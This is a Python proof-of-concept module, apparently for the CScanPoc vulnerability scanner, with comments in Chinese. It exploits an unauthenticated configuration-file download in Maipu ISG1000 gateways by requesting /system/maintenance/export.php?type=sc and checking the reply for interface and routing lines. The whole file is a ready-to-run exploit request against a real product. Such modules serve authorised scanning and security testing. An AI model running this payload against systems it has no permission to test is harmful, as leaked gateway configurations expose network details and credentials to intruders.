# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'MPsec_0002' # 平台漏洞编号，留空
    name = '迈普ISG1000系列网关 配置文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-10-21'  # 漏洞公布时间
    desc = '''
        迈普ISG1000系列网关，未授权下载配置文件。
        system/maintenance/export.php?type=sc
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '迈普'  # 漏洞应用名称
    product_version = '迈普ISG1000系列网关'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a5cec5bd-0bc7-475e-ac17-d7d4d044e5d0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer     :  http://www.wooyun.org/bugs/wooyun-2014-079924
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/system/maintenance/export.php?type=sc"
            url = arg + payload
            code, head, res, errcode, _ = hh.http(url )

            if 'interface eth0' in res and code ==200 and 'ip route' in res:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
